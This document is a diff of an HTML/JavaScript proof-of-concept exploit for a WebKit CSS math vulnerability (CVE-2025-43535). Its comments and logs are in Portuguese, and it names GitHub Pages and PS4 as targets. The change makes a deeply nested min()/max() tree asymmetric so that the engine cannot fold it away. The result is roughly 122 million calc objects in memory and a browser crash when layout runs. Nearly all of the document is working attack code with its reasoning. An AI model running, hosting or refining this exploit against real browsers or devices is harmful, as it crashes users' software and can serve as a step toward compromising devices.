@@ -1,40 +1,26 @@
 <!DOCTYPE html>
 <!--
-  PoC FINAL: CVE-2025-43535
-  WebKit CSS Math — CSSCalcValue heap exhaustion
+  PoC FINAL: CVE-2025-43535 — asymSym
 
-  POR QUE 1px/2px NÃO FUNCIONOU:
+  POR QUE % TAMBÉM NÃO FUNCIONOU:
   ════════════════════════════════════════════════════════════
-  min(1px, 2px) = 1px em PARSE TIME — ambas são unidades
-  absolutas. WebKit resolve e descarta a árvore imediatamente.
-  Zero objetos CSSCalcValue criados. Zero pressão.
+  sym(N, leaf) cria min(leaf, leaf) em CADA nível.
+  WebKit aplica min(x, x) = x como identidade ESTRUTURAL —
+  independente de x ser px, % ou qualquer unidade.
+  Não precisa saber o valor, só detectar que os dois ramos
+  são a mesma expressão. Zero objetos criados.
 
-  SOLUÇÃO — FOLHAS COM UNIDADES RELATIVAS (%):
+  SOLUÇÃO — asymSym: trocar cA e cB a cada nível
   ════════════════════════════════════════════════════════════
-  min(1%, 2%) NÃO pode ser resolvido sem contexto de layout.
-  O WebKit cria os 122M objetos CSSCalcValue e mantém na
-  memória até a chamada de offsetWidth resolvê-los.
-  Em offsetWidth: 122M objetos no heap C++ → OOM → crash.
+  asymSym(N, cA, cB):
+    N=0 → cA
+    N>0 → min( asymSym(N-1, cA, cB),   ← filho esq usa A→B
+               asymSym(N-1, cB, cA) )  ← filho dir usa B→A
 
-  Mesmo mecanismo do Blob (que crashou localmente),
-  mas o crash ocorre em offsetWidth em vez do carregamento.
-  Resultado idêntico. Funciona no GitHub Pages (sem blob:).
-
-  ESTRUTURA (1044MB, 122M nós):
-  ════════════════════════════════════════════════════════════
-  max(                              ← raiz usa max() para
-    sym(10, '1%'),                    garantir avaliação
-    min(                              de ambos os ramos
-      sym(9,  '2%'),
-      min(
-        sym(8, '1%'),
-        sym(6, '2%')
-      )
-    )
-  )
-
-  JS heap: cA(576KB) + cB(576KB) + arrays ≈ 1.2MB
-  Sem blob: URL · Sem SW · GitHub Pages ✓ · PS4 ✓
+  Em cada nó: filho_esq ≠ filho_dir (estruturas espelhadas)
+  → WebKit não pode aplicar min(x,x)=x
+  → DEVE criar ambos os objetos CSSCalcValue
+  → 122M objetos no heap C++ → OOM → crash
 -->
 <html>
 <head>
@@ -58,12 +44,10 @@
 </head>
 <body>
 <div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
-  CVE-2025-43535 · folhas % · JS~1.2MB · sem blob · GitHub/PS4
+  CVE-2025-43535 · asymSym · JS~1.2MB · sem blob · GitHub/PS4
 </div>
 <div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
-
-<!-- Container com tamanho definido — necessário para % ser não-zero -->
 <div id="stage" style="position:absolute;top:-9999px;left:-9999px;
                        width:500px;height:500px;overflow:hidden">
   <div id="target" style="position:absolute;visibility:hidden"></div>
@@ -82,10 +66,6 @@ function L(m, c) {
 }
 function bar(m) { barEl.textContent = m; }
 
-// ─────────────────────────────────────────────────────────────
-// Constrói c16 com folha relativa.
-// '1%' e '2%' = unidades relativas → não resolvíveis em parse time
-// ─────────────────────────────────────────────────────────────
 function buildDepth(depth, leaf) {
   var e = leaf;
   for (var d = 1; d <= depth; d++) {
@@ -96,29 +76,33 @@ function buildDepth(depth, leaf) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// insertSym: insere árvore simétrica via TextNodes.
-// levels de recursão → sem stack overflow (max 10).
+// insertAsymSym: insere árvore assimétrica via TextNodes.
+// A cada nível, filho_esq usa (cA,cB) e filho_dir usa (cB,cA).
+// → Nenhum par de irmãos é estruturalmente idêntico.
+// → WebKit não pode aplicar min(x,x)=x.
+// Recursão máxima = 10 níveis → sem stack overflow.
 // ─────────────────────────────────────────────────────────────
-function insertSym(parent, levels, leaf) {
+function insertAsymSym(parent, levels, cA, cB) {
   if (levels === 0) {
-    parent.appendChild(document.createTextNode(leaf));
+    parent.appendChild(document.createTextNode(cA));
     return;
   }
   parent.appendChild(document.createTextNode('min('));
-  insertSym(parent, levels - 1, leaf);
+  // filho esquerdo: A como primária, B como secundária
+  insertAsymSym(parent, levels - 1, cA, cB);
   parent.appendChild(document.createTextNode(','));
-  insertSym(parent, levels - 1, leaf);
+  // filho direito: B como primária, A como secundária (TROCADO)
+  insertAsymSym(parent, levels - 1, cB, cA);
   parent.appendChild(document.createTextNode(')'));
 }
 
 function run() {
-  L('CVE-2025-43535 · folhas % · sem constant-fold', 'info');
-  L('Crash ocorre em offsetWidth (não no parse) — mesma OOM', 'info');
+  L('CVE-2025-43535 · asymSym (folding estrutural eliminado)', 'info');
+  L('min(x,x)=x não aplicável: filhos sempre distintos', 'info');
   L('', '');
 
-  // ── 1: construir cA='1%' e cB='2%' (576KB cada) ──────────
   bar('[1/4] Construindo cA(1%) e cB(2%)...');
-  L('[1/4] buildDepth(16, "1%") e buildDepth(16, "2%")...', 'warn');
+  L('[1/4] cA = depth=16 com folha "1%" (576KB)...', 'warn');
 
   setTimeout(function() {
 
@@ -126,50 +110,44 @@ function run() {
     try {
       cA = buildDepth(16, '1%');
       cB = buildDepth(16, '2%');
-      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB (1%) ✓', 'ok');
-      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB (2%) ✓', 'ok');
+      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB ✓', 'ok');
+      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB ✓', 'ok');
+      L('[1/4] JS heap: ~' + ((cA.length+cB.length)/1024).toFixed(0) + 'KB ✓', 'ok');
     } catch(e) {
       L('[1/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
     }
 
-    // ── 2: montar <style> offline com TextNodes ───────────────
-    bar('[2/4] Inserindo TextNodes (1044MB)...');
-    L('[2/4] max(sym10_1%, min(sym9_2%, min(sym8_1%, sym6_2%)))...', 'warn');
-    L('[2/4] % = não-resolvível em parse time → 122M CSSCalcValue pendentes', 'info');
+    bar('[2/4] Inserindo TextNodes assimétricos (1044MB)...');
+    L('[2/4] asymSym: filho_esq(A,B) ≠ filho_dir(B,A) em cada nó', 'info');
 
     setTimeout(function() {
 
       var styleEl = document.createElement('style');
-
       try {
         styleEl.appendChild(document.createTextNode('#target{width:'));
 
-        // Raiz: max() para forçar avaliação de ambos os ramos
-        // (max precisa comparar → não pode descartar nenhum)
+        // Raiz: max() — precisa avaliar ambos os ramos para comparar
         styleEl.appendChild(document.createTextNode('max('));
 
-          // ramo esquerdo: sym(10, cA) = 576MB com folha '1%'
-          insertSym(styleEl, 10, cA);
+          // Esquerdo: asymSym(10) = 576MB
+          insertAsymSym(styleEl, 10, cA, cB);
 
           styleEl.appendChild(document.createTextNode(','));
 
-          // ramo direito: min(sym9_B, min(sym8_A, sym6_B))
+          // Direito: min( asymSym(9), min(asymSym(8), asymSym(6)) )
           styleEl.appendChild(document.createTextNode('min('));
-            insertSym(styleEl, 9, cB);           // 288MB '2%'
+            insertAsymSym(styleEl, 9, cB, cA);   // 288MB — cB como primária
             styleEl.appendChild(document.createTextNode(','));
             styleEl.appendChild(document.createTextNode('min('));
-              insertSym(styleEl, 8, cA);          // 144MB '1%'
+              insertAsymSym(styleEl, 8, cA, cB); // 144MB
               styleEl.appendChild(document.createTextNode(','));
-              insertSym(styleEl, 6, cB);          //  36MB '2%'
+              insertAsymSym(styleEl, 6, cB, cA); //  36MB
             styleEl.appendChild(document.createTextNode(')'));
           styleEl.appendChild(document.createTextNode(')'));
 
         styleEl.appendChild(document.createTextNode(')}'));
 
-        var nodeCount = styleEl.childNodes.length;
-        L('[2/4] ' + nodeCount + ' TextNodes ✓', 'ok');
-
-        // Liberar strings do JS heap — TextNodes têm cópias
+        L('[2/4] ' + styleEl.childNodes.length + ' TextNodes ✓', 'ok');
         cA = null; cB = null;
         L('[2/4] cA e cB liberados ✓', 'ok');
 
@@ -178,32 +156,26 @@ function run() {
         L('[2/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
       }
 
-      // ── 3: conectar ao DOM ────────────────────────────────
       bar('[3/4] Conectando ao DOM...');
-      L('[3/4] appendChild → CSS parser indexa 1044MB...', 'warn');
-      L('[3/4] (crash aqui ou em offsetWidth — ambos = CVE presente)', 'crash');
+      L('[3/4] CSS parser indexa 1044MB de expressões assimétricas...', 'warn');
+      L('[3/4] ◀◀ CRASH = CVE PRESENTE ▶▶', 'crash');
 
       setTimeout(function() {
         try {
           document.head.appendChild(styleEl);
-          L('[3/4] Stylesheet conectada ✓', 'ok');
-        } catch(e) {
-          L('[3/4] ' + e, 'fail');
-        }
+          L('[3/4] Conectada ✓', 'ok');
+        } catch(e) { L('[3/4] ' + e, 'fail'); }
 
-        // ── 4: forçar layout — ponto do crash ─────────────────
-        bar('[4/4] offsetWidth — 122M objetos sendo criados...');
-        L('[4/4] TRIGGER: offsetWidth força resolução de 1044MB de %...', 'warn');
-        L('[4/4] ◀◀ SE O BROWSER FECHAR AQUI: CRASH = CVE PRESENTE ▶▶', 'crash');
+        bar('[4/4] offsetWidth — resolvendo 122M objetos CSSCalcValue...');
+        L('[4/4] TRIGGER: offsetWidth força layout...', 'warn');
+        L('[4/4] ◀◀ CRASH AQUI = CVE PRESENTE ▶▶', 'crash');
 
         setTimeout(function() {
           try {
             void target.offsetWidth;
             var w = window.getComputedStyle(target).getPropertyValue('width');
             L('[4/4] width="' + w + '" ✓', 'ok');
-          } catch(e) {
-            L('[4/4] exceção: ' + e, 'fail');
-          }
+          } catch(e) { L('[4/4] ' + e, 'fail'); }
 
           try { document.head.removeChild(styleEl); } catch(e) {}
 
